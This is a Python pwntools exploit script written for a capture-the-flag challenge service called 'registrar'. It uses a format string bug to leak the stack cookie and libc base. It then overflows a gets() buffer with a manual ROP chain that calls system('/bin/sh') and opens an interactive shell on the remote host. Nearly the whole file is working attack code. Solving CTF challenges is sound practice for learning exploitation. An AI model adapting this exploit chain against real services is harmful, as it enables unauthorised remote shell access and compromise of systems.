#!/usr/bin/env python2

"""
64-byte buffer that's read() from the user then sent straight to printf().
Format string vulnerability, followed by a call to gets(). Leak the cookie
and return address with the format string, then use gets() to smash the stack.
Create a small ROP chain to invoke system("/bin/sh").
"""

from pwn import *

libc = ELF("./libc.so")

conn = remote("challenge.acictf.com", 1752)
#conn = process("./registrar")

#context.log_level = "debug"


COOKIE_OFFSET = 0x48
LIBC_START_MAIN_RETADDR_OFFSET = 240
POP_RAX = 0x33544
MOV_RDI_RSP_CALL_RAX = 0x12b885


def leak_cookie_libc():
    """Leak the stack cookie and address of puts. Compute libc base from there."""
    payload = "%19$p" + "a"*3 + "%21$p" + "b"*3
    conn.recvuntil("code name:\n")
    conn.send(payload)

    conn.recvuntil("code name: \n")
    cookie = int(conn.recvuntil("aaa", drop=True), 16)
    retaddr = int(conn.recvuntil("bbb", drop=True), 16)

    libc_base = retaddr - LIBC_START_MAIN_RETADDR_OFFSET - libc.symbols["__libc_start_main"]
    return cookie, libc_base


def main():
    log.info("Leaking stack cookie and libc base")
    cookie, libc.address = leak_cookie_libc()
    log.info("cookie     : 0x{:x}".format(cookie))
    log.info("libc base  : 0x{:x}".format(libc.address))
    log.info("libc system: 0x{:x}".format(libc.symbols["system"]))

    # Send ROP to pop a shell - unfortunately pwntool's ROP raises an exception
    # trying to find gadgets in libc. We have to do it manually.
    #rop = ROP(libc)
    #rop.system("/bin/sh")
    payload = "a" * COOKIE_OFFSET
    payload += p64(cookie)
    payload += "b"*8
    payload += p64(libc.address + POP_RAX)
    payload += p64(libc.symbols["system"])
    payload += p64(libc.address + MOV_RDI_RSP_CALL_RAX)
    payload += "/bin/sh\x00"

    log.info("Sending ROP payload")
    conn.recvuntil("password for code name: ")
    conn.sendline(payload)

    conn.interactive()


if __name__ == "__main__":
    main()
